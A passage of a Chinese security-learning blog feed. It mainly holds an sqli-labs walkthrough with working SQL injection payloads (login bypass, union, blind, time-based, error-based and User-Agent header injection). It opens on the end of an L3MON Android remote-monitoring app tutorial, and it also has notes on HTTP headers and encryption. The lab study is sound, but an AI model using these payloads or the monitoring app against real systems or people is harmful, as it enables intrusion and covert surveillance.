src="/2021/12/01/L3MON-%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E7%9B%91%E6%8E%A7%E6%95%99%E7%A8%8B/image14.png" alt="image14"></p><p><img src="/2021/12/01/L3MON-%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E7%9B%91%E6%8E%A7%E6%95%99%E7%A8%8B/image15.png" alt="image15"></p><p><strong>这里输入你服务器的公网ip，后面端口任意指定（端口开启且不被占用）</strong></p><p>就能生成app，然后安卓手机安装之后就能点击Devices来监控安卓手机信息！</p><p><img src="/2021/12/01/L3MON-%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E7%9B%91%E6%8E%A7%E6%95%99%E7%A8%8B/image16.png" alt="image16"></p><p><strong>结束！勿用于任何违法行为！仅供参考！（吃皇粮、银手镯警告！）</strong></p><p>文章参考于</p><p><a href="https://blog.csdn.net/weixin_46706771/article/details/120383035">https://blog.csdn.net/weixin_46706771/article/details/120383035</a></p><p><a href="https://www.iculture.cc/sg/pig=2373">https://www.iculture.cc/sg/pig=2373</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sqlilabs——sql注入学习（二）</title>
      <link href="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="四、Sqlilabs关卡学习"><a href="#四、Sqlilabs关卡学习" class="headerlink" title="四、Sqlilabs关卡学习"></a>四、Sqlilabs关卡学习</h1><h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><p>这关开始进入到post注入的内容，什么是post呢？就是数据从客户端提交到服务器端，例如我们在登录过程中，输入用户名和密码，用户名和密码以表单的形式提交，提交到服务器后服务器再进行验证，这就是一次post的过程。</p><p>例如<strong>Less-11</strong>，我们输入正确的用户名和密码后，会有如下显示</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image1.png" alt="image1"></p><p>我们可以看到源码，当我们输入用户名和密码后整合成的sql语句是这样的</p><p><code>SELECT username, password FROM users WHERE username=&#39;$uname&#39; and password=&#39;$passwd&#39; LIMIT 0,1</code></p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image2.png" alt="image2"></p><p>我们试一下在用户名或者密码那里加上单引号和注释符，再正确输入用户名和密码试试</p><p>看看情况</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image3.png" alt="image3"></p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image4.png" alt="image4"></p><p>均有报错，我们可以试试万能密码:</p><p>username：admin’or’1’=‘1#</p><p>password：asd(随便输)</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image5.png" alt="image5"></p><p>通过了，此时的sql语句是这样的</p><p><code>SELECT username, password FROM users WHERE username=&#39;admin&#39;or&#39;1&#39;=&#39;1# and password=&#39;asd&#39; LIMIT 0,1</code></p><p>在#后面的内容全部被注释掉，前面的内容由于带有or 1=1恒成立，因此语句成立，此时以admin的用户登录，接下来可以尝试用get注入中用到的其他语句来代替or 1=1进行注入。</p><p>比如，<strong>利用union注入:</strong></p><p>username：1admin’ union select 1,database()#</p><p>password：asd(随便输)</p><p>同样的前面的1admin是为了显示出后面的查询内容</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image6.png" alt="image6"></p><p>这样就注入成功！</p><h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><p>本关和Less-11类似，只是在id的参数由单引号变为了双引号加圆括号，我们这里改变输入成这样</p><p>username：1admin”) union select 1,database()#</p><p>password：asd(随便输入)</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image7.png" alt="image7"></p><p>注入成功！</p><h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><p>我们可以看到源码，id的赋值还是单引号加圆括号，但是后面的输出被注释掉了，所以我们这里是没有信息回显的</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image8.png" alt="image8"></p><p>输入：</p><p>username：admin’) union select 1,2#</p><p>password：asd(随便输)</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image9.png" alt="image9"></p><p>所以我们就得考虑盲注了。</p><p>例如使用布尔类型的盲注，猜测数据库的第一位</p><p>username：admin’) and left(database(),1)&gt;’a’#</p><p>password：asd(随便输)</p><p>发现没报错</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image10.png" alt="image10"></p><p>因为数据库的名字是security，第一位s明显大于a，如果判断错误，比如这样输入</p><p>username：admin’) and left(database(),1)&lt;’a’#</p><p>password：asd(随便输)</p><p>就会报错</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image11.png" alt="image11"></p><p>后面的注入与之前相同。</p><p><strong>注意：</strong>这里的注入过程我都是在输入框里面进行的，其实我们也可以通过burpsuite来抓取完整的sql语句来进行注入，不进行介绍了。</p><h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><p>随便输入测试一下</p><p>username：admin”</p><p>password：asd（随意）</p><p>发现报错</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image12.png" alt="image12"></p><p>这样我们就知道传参进行了双引号操作，这里同Less-13</p><p><strong>盲注：</strong></p><p>username：admin”and left(database(),1)&gt;’a’#</p><p>password：asd（随便输）</p><p>同样的显示正常。</p><p><strong>报错注入：</strong></p><p>username：admin”and extractvalue(1,concat(0x7e,(select @@version),0x7e))#</p><p>password：asd（随便输）</p><p>爆版本</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image13.png" alt="image13"></p><p>username：admin”and extractvalue(1,concat(0x7e,(select database()),0x7e))#</p><p>password：asd（随便输）</p><p>爆数据库名称</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image14.png" alt="image14"></p><h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><p>这关没正确和错误的提示，因此考虑延时注入，可以看到源码中的sql语句，有单引号</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image15.png" alt="image15"></p><p>我们输入如下：</p><p>username：admin’and if(ascii(substr(database(),1,1))=115,1,sleep(5))#</p><p>password：asd(随便输)</p><p>没有时间延迟说明数据库名的第一位猜对了。</p><h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><p>本关和<strong>Less-15</strong>相同，只不过对参数的处理从单引号变为了双引号。</p><h2 id="补充知识——增删改查函数介绍"><a href="#补充知识——增删改查函数介绍" class="headerlink" title="补充知识——增删改查函数介绍"></a>补充知识——增删改查函数介绍</h2><h3 id="1-增加一行数据——insert"><a href="#1-增加一行数据——insert" class="headerlink" title="1.增加一行数据——insert"></a>1.增加一行数据——<strong>insert</strong></h3><p><strong>举例</strong></p><p><code>insert into wp_news values(3,&#39;abaaba&#39;,&#39;hello world!&#39;);</code></p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image16.png" alt="image16"></p><h3 id="2-删除数据——delete"><a href="#2-删除数据——delete" class="headerlink" title="2.删除数据——delete"></a>2.删除数据——delete</h3><p>delete from 表名;</p><p>delete from 表名 where id=1;</p><p><strong>举例</strong></p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image17.png" alt="image17"></p><h3 id="3-删除结构——drop"><a href="#3-删除结构——drop" class="headerlink" title="3.删除结构——drop"></a>3.删除结构——drop</h3><p>删数据库：drop database 数据库名;</p><p>删除表：drop table 表名;</p><p>删除表中的列：alter table 表名 drop column 列名;</p><h3 id="4-修改——update"><a href="#4-修改——update" class="headerlink" title="4.修改——update"></a>4.修改——update</h3><p>修改所有：update 表名 set 列名=’新的值，不是数字的话加单引号’;</p><p>待条件的修改：update 表名 set 列名=’新的值，不是数字的话加单引号’ where id=6;</p><p><strong>举例：</strong></p><p><code>update wp_news set title=&#39;fuck&#39; where id=2;</code></p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image18.png" alt="image18"></p><h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><p>这关我们可以看到是一个修改密码的过程，利用的是update语句，与在用select时是一样的，我们仅需要将原先的闭合，再构造自己的payload。</p><p>查看登录用的账号和密码</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image19.png" alt="image19"></p><p>尝试输入：</p><p>User Name：admin</p><p>New Password：1’</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image20.png" alt="image20"></p><p>从报错信息我们可以看到对参数password的处理是单引号。</p><p>考虑报错注入</p><p>User Name：admin</p><p>New Password：11’and left(database(),1)&gt;’a’#</p><p>这里发现个问题，用这个输入的话整个列表users的密码都会更改，而且不是更改成11，而是1！很奇怪！<strong>（后面再看）</strong></p><p>利用其他的报错注入，爆版本号</p><p>User Name：admin</p><p>New Password：11’and extractvalue(1,concat(0x7e,(select@@version),0x7e))#</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image21.png" alt="image21"></p><p>延时注入也可以，不再演示。</p><p><strong>我们可以看源代码，在执行update语句之前会先执行一次select语句，为什么我们不从username处进行构造呢？</strong></p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image22.png" alt="image22"></p><p>我们再看一下源代码中的check_input()函数</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image23.png" alt="image23"></p><p>再介绍其中几个函数</p><p><strong>1.addslashes(string)</strong></p><p>string    必需。规定要转义的字符串</p><p>返回值    返回已转义的字符串。</p><p>addslasher()函数返回在预定义字符之前添加反斜杠的字符串。</p><p>预定义字符是：</p><ul><li>单引号’’</li><li>双引号””</li><li>反斜杠\</li><li>NULL</li></ul><p>提示：该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。</p><p>注释：默认地，PHP对所有的GET、POST和COOKIE数据自动运行addslashes()。所以您<br>不应对已转义过的字符串使用addslashes()，因为这样会导致双层转义。遇到这种情况时可<br>以使用函数get_magic_quotes_gpc()进行检测。</p><p><strong>2.stripslasher(string,connection)</strong></p><p>string    必需。规定要转义的字符串。</p><p>connection    可选。规定Mysql连接。如果未规定，则用上一个连接。</p><p>函数删除由addslashes()函数添加的反斜杠。</p><p>3.mysql_real_escape_string()</p><p>函数转义SQL语句中使用的字符串中的特殊字符。</p><p>以下字符受影响：</p><ul><li>\x00</li><li>\n</li><li>\r</li><li>\</li><li>‘</li><li>“</li><li>\x1a</li></ul><p>如果成功，则该函数返回被转义的字符串。如果失败，则返回false。</p><p>说明：本函数将string中的特殊字符转义，并考虑到连接的当前字符集，因此可以安全用<br>于mysql_query()。</p><p>可以看到在less17的check_input()中，对username进行各种转义的处理，所以此处不能使用<br>username进行注入。</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image24.png" alt="image24"></p><h2 id="补充知识——HTTP头部介绍"><a href="#补充知识——HTTP头部介绍" class="headerlink" title="补充知识——HTTP头部介绍"></a>补充知识——HTTP头部介绍</h2><p>在利用抓包工具进行抓包的时候，我们能看到很多的项，下面详细讲解每一项。</p><p><strong>HTTP头部详解</strong></p><p><strong>1.Accept:</strong></p><p>告诉WEB服务器自己接受什么介质类型，*/*表示任何类型，type/*表示该类型下的所有子类型 ，type/sub-type。</p><p><strong>2.Accept-Charset:</strong></p><p>浏览器申明自己接收的字符集</p><p><strong>3.Accept-Encoding:</strong></p><p>浏览器申明自己接收的编码方法，通常指定压缩方法，是否支持压缩，支持什么压缩方法（gzip，deflate）</p><p><strong>4.Accept-Language:</strong></p><p>浏览器申明自己接收的语言</p><p><strong>（注：语言跟字符集的区别：中文是语言，中文有多种字符集，比如big5，gb2312，gbk等等。)</strong></p><p><strong>5.Accept-Ranges:</strong></p><p>WEB服务器表明自己是否接受获取其某个实体的一部分（比如文件的一部分）的请求。bytes：表示接受，none：表示不接受。</p><p><strong>6.Age:</strong></p><p>当代理服务器用自己缓存的实体去响应请求时，用该头部表明该实体从产生到现在经过多长时间了。</p><p><strong>7.Authorization:</strong></p><p>当客户端接收到来自WEB服务器的WWW-Authenticate响应时，用该头部来回应自己的身份验证信息给WEB服务器。</p><p><strong>8.Cache-Control:</strong></p><p>请求：</p><p>no-cache（不要缓存的实体，要求现在从WEB服务器去取）<br>max-age：（只接受Age值小于max-age值，并且没有过期的对象）<br>max-stale：（可以接受过去的对象，但是过期时间必须小于max-stale值）<br>min-fresh：（接受其新鲜生命期大于其当前Age跟min-fresh值之和的缓存对象）<br>响应：</p><p>public：（可以用Cached内容回应任何用户)<br>private：（只能用缓存内容回应先前请求该内容的那个用户）<br>no-cache：（可以缓存，但是只有在跟WEB服务器验证了其有效后，才能返回给客户端）<br>max-age：（本响应包含的对象的过期时间）<br>ALL:no-store（不允许缓存）</p><p><strong>9.Connection:</strong></p><p>请求：</p><p>close：（告诉WEB服务器或者代理服务器，在完成本次请求的响应后，断开连接，不要等待本次连接的后续请求了）</p><p>keepalive：（告诉WEB服务器或者代理服务器，在完成本次请求的响应后，保持连接，等待本次连接的后续请求）</p><p>响应：</p><p>close：（连接已经关闭）</p><p>keepalive：（连接保持着，在等待本次连接的后续请求）</p><p>Keep-Alive：（如果浏览器请求保持连接，则该头部表明希望WEB服务器保持连接多长时间<br>（秒）。例如：Keep-Alive：300）</p><p><strong>10.Content-Encoding：</strong></p><p>WEB服务器表明自己使用了什么压缩方法（gzip，deflate）压缩响应中的对象。例如：Content-Encoding：gzip</p><p><strong>11.Content-Language:</strong></p><p>WEB服务器告诉浏览器自己响应的对象的语言。</p><p><strong>12.Content-Length:</strong></p><p>WEB服务器告诉浏览器自己响应的对象的长度。例如：Content-Length:26012</p><p><strong>13.Content-Range:</strong></p><p>WEB服务器表明该响应包含的部分对象为整个对象的哪个部分。例如：Content-Range:bytes21010-47021/47022</p><p><strong>14.Content-Type:</strong></p><p>WEB服务器告诉浏览器自己响应的对象的类型。例如：Content-Type：application/xml</p><p><strong>15.ETag:</strong></p><p>就是一个对象（比如URL）的标志值，就一个对象而言，比如一个html文件，如果被修改了，其Etag也会别修改，所以ETag的作用跟Last-Modified的作用差不多，主要供WEB服务器判断一个对象是否改变了。比如前一次请求某个html文件时，获得了其ETag，当这次又请求这个文件时，浏览器就会把先前获得的ETag值发送给WEB服务器，然后WEB服务器会把这个ETag跟该文件的当前ETag进行对比，然后就知道这个文件有没有改变了。</p><p><strong>16.Expired:</strong></p><p>WEB服务器表明该实体将在什么时候过期，对于过期了的对象，只有在跟WEB服务器验证了其有效性后，才能用来响应客户请求。是HTTP/1.0的头部。例如：Expires：Sat,23May200910:02:12GMT。</p><p><strong>17.Host:</strong></p><p>客户端指定自己想访问的WEB服务器的域名/IP地址和端口号。例如：Host：rss.sina.com.cn。</p><p><strong>18.if-Match:</strong></p><p>如果对象的ETag没有改变，其实也就意味著对象没有改变，才执行请求的动作。</p><p><strong>19.If-None-Match</strong></p><p>如果对象的ETag改变了，其实也就意味著对象也改变了，才执行请求的动作。</p><p><strong>20.If-Modified-Since:</strong></p><p>如果请求的对象在该头部指定的时间之后修改了，才执行请求的动作（比如返回对象），否则返回代码304，告诉浏览器该对象没有修改。例如：If-Modified-Since：Thu,10Apr200809:14:42GMT.</p><p><strong>21.If-Unmodified-Since:</strong></p><p>如果请求的对象在该头部指定的时间之后没修改过，才执行请求的动作（比如返回对象）。</p><p><strong>22.If-Range:</strong></p><p>浏览器告诉WEB服务器，如果我请求的对象没有改变，就把我缺少的部分给我，如果对象改变了，就把整个对象给我。浏览器通过发送请求对象的ETag或者自己所知道的最后修改时间给WEB服务器，让其判断对象是否改变了。总是跟Range头部一起使用。</p><p><strong>23.Last-Modified:</strong></p><p>WEB服务器认为对象的最后修改时间，比如文件的最后修改时间，动态页面的最后产生时间等等。例如：Last-Modified：Tue,06May200802:42:43GMT。</p><p><strong>24.Location</strong></p><p>WEB服务器告诉浏览器，试图访问的对象已经被移到别的位置了，到该头部 指 定 的 位 置 去 取 。 例 如 ：Location：<a href="http://i0.sinaimg.cn/dy/deco/2008/0528/sinahome_0803_ws_005_text_0.gif">http://i0.sinaimg.cn/dy/deco/2008/0528/sinahome_0803_ws_005_text_0.gif</a></p><p><strong>25.Pramga:</strong></p><p>主要使用Pramga:no-cache，相当于Cache-Control：no-cache。例如：Pragma：no-cache</p><p><strong>26.Proxy-Authenticate：</strong></p><p>代理服务器响应浏览器，要求其提供代理身份验证信息。Proxy-Authorization：浏览器响应代理服务器的身份验证请求，提供自己的身份信息。</p><p><strong>27.Range：</strong></p><p>浏览器（比如Flashget多线程下载时）告诉WEB服务器自己想取对象的哪部分。例如：Range:bytes=1173546-</p><p><strong>28.Referer:</strong></p><p>浏览器向WEB服务器表明自己是从哪个网页/URL获得/点击当前请求中的网址/URL。例如：Referer：<a href="http://www.sina.com/">http://www.sina.com/</a></p><p><strong>29.Server:</strong></p><p>WEB服务器表明自己是什么软件及版本等信息。例如：Server：Apache/2.0.61(Unix)</p><p><strong>30.User-Agent:</strong></p><p>浏览器表明自己的身份（是哪种浏览器）。例如：User-Agent：Mozilla/5.0<br>(Windows;U;WindowsNT5.1;zh-CN;rv:1.8.1.14)Gecko/20080404Firefox/2、0、0、14</p><p><strong>31.Transfer-Encoding:</strong></p><p>WEB服务器表明自己对本响应消息体（不是消息体里面的对象）作了怎样的编码，比如是否分块（chunked）。例如：Transfer-Encoding:chunked</p><p><strong>32.Vary:</strong></p><p>WEB服务器用该头部的内容告诉Cache服务器，在什么条件下才能用本响应所返回的对象响应后续的请求。假如源WEB服务器在接到第一个请求消息时，其响应消息的头部为：Content-Encoding:gzip;Vary:Content-Encoding那么Cache服务器会分析后续请求消息的头部，检查其Accept-Encoding，是否跟先前响应的Vary头部值一致，即是否使用相同的内容编码方法，这样就可以防止Cache服务器用自己Cache里面压缩后的实体响应给不具备解压能力的浏览器。例如：Vary：Accept-Encoding。</p><p><strong>33.Via：</strong></p><p>列出从客户端到OCS或者相反方向的响应经过了哪些代理服务器，他们用什么协议（和版本）发送的请求。当客户端请求到达第一个代理服务器时，该服务器会在自己发出的请求里面添加Via头部，并填上自己的相关信息，当下一个代理服务器收到第一个代理服务器的请求时，会在自己发出的请求里面复制前一个代理服务器的请求的Via头部，并把自己的相关信息加到后面，以此类推，当OCS收到最后一个代理服务器的请求时，检查Via头部，就知道该请求所经过的路由。例如：Via：1.0236.D0707195.sina.com.cn:80(squid/2.6.STABLE13)</p><h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><p>从源码中我们可以看到，对用POST提交的Username和Password都进行了类似魔术引号的处理，因此我们在用户名和密码的输入框上进行注入是行不通的。</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image25.png" alt="image25"></p><p>这关我们输入正确的用户名和密码，发现有返回我们本机的信息，我们再看源码，发现确实是有insert函数来提交我们本机信息。</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image26.png" alt="image26"></p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image27.png" alt="image27"></p><p>上面的insert函数有将我们本机的useragent和IP插入到数据库中，于是我们可以通过抓包来修改useragent和Ip来进行注入。由于ip地址在这里修改会比较麻烦，于是我们来修改useragent。</p><p>比如我抓到包并将user-agent修改为dddd，那么登陆成功后弹出提示就是dddd。</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image28.png" alt="image28"></p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image29.png" alt="image29"></p><p>这样的话我们可以将dddd修改为一条注入语句，比如</p><p><code>&#39;and extractvalue(1,concat(0x7e,(select@@version),0x7e)) and&#39;1&#39;=&#39;1</code></p><p>这里为了看的更加明显，我把这条insert语句输出在屏幕上。</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image30.png" alt="image30"></p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image31.png" alt="image31"></p><p>对于这条语句<code>&#39;and extractvalue(1,concat(0x7e,(select@@version),0x7e)) and&#39;1&#39;=&#39;1</code></p><p>前面的’是为了闭合’$uagent’最前面的’，但是后面还有个’，于是我们用一个判断式子’1’=’1来闭合掉后面的’，最终的insert语句是这样的。</p><p><code>INSERT INTO security.uagents (uagent, ip_address, username) VALUES  (&#39;&#39;and extractvalue(1,concat(0x7e,(select@@version),0x7e)) and&#39;1&#39;=&#39;1&#39;,  &#39;192.168.176.1&#39;, &#39;admin&#39;)</code></p><p>并且爆出了版本号。其余的操作不加演示。</p><h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><p>待更！</p>]]></content>
      
      
      <categories>
          
          <category> web安全渗透学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入，mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基础入门——加密编码算法</title>
      <link href="/2021/11/26/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/"/>
      <url>/2021/11/26/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="06-基础入门——加密编码算法"><a href="#06-基础入门——加密编码算法" class="headerlink" title="06 基础入门——加密编码算法"></a>06 基础入门——加密编码算法</h1><h3 id="常见加密编码等算法解析"><a href="#常见加密编码等算法解析" class="headerlink" title="常见加密编码等算法解析"></a><strong>常见加密编码等算法解析</strong></h3><p>MD5，SHA,，ASC,进制，时间戳，URL， BASE64， Unescape, AES, DES等</p><h3 id="常见加密形式算法解析"><a href="#常见加密形式算法解析" class="headerlink" title="常见加密形式算法解析"></a>常见加密形式算法解析</h3><p>直接加密，带salt, 带密码，带偏移，带位数，带模式，带干扰，自定义组合等</p><h3 id="常见解密方式-针对"><a href="#常见解密方式-针对" class="headerlink" title="常见解密方式(针对)"></a>常见解密方式(针对)</h3><p>枚举，自定义逆向算法，可逆向.</p><h3 id="了解常规加密算法的特性"><a href="#了解常规加密算法的特性" class="headerlink" title="了解常规加密算法的特性"></a>了解常规加密算法的特性</h3><p>长度位数，字符规律，代码分析，搜索获取等</p>]]></content>
      
      
      <categories>
          
          <category> 小迪安全学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全学习，学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>墨者在线靶场学习（二）</title>
      <link href="/2021/11/25/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2021/11/25/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="靶场一——SQL手工注入漏洞测试-MySQL数据库"><a href="#靶场一——SQL手工注入漏洞测试-MySQL数据库" class="headerlink" title="靶场一——SQL手工注入漏洞测试(MySQL数据库)"></a>靶场一——SQL手工注入漏洞测试(MySQL数据库)</h1><p><img src="/2021/11/25/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image1.png" alt="image1"></p><h2 id="背景介绍："><a href="#背景介绍：" class="headerlink" title="背景介绍："></a>背景介绍：</h2><p>刚搭建好一个靶场环境Nginx+PHP+MySQL，PHP代码对客户端提交的参数未做任何过滤。</p><h2 id="实训目标："><a href="#实训目标：" class="headerlink" title="实训目标："></a>实训目标：</h2><ul><li>掌握SQL注入原理；</li><li>了解手工注入的方法；</li><li>了解MySQL的数据结构；</li><li>了解字符串的MD5加解密；</li></ul><h2 id="解题方向："><a href="#解题方向：" class="headerlink" title="解题方向："></a>解题方向：</h2><p>手工进行SQL注入测试，获取管理密码登录。</p><p><strong>1.启动靶场，进入</strong></p><p>发现主页除了登录地址外，只有一个停机通知</p><p><img src="/2021/11/25/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image2.png" alt="image2"></p><p>点进停机通知</p><p><img src="/2021/11/25/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image3.png" alt="image3"></p><p><strong>2.测试注入点</strong></p><p>随便输入值，发现界面不正常，有注入点</p><p><img src="/2021/11/25/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image4.png" alt="image4"></p><p>用order by来查询有多少列数据，order by 4正常，order by 5不正常，说明有四列数据</p><p><img src="/2021/11/25/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image5.png" alt="image5"></p><p><img 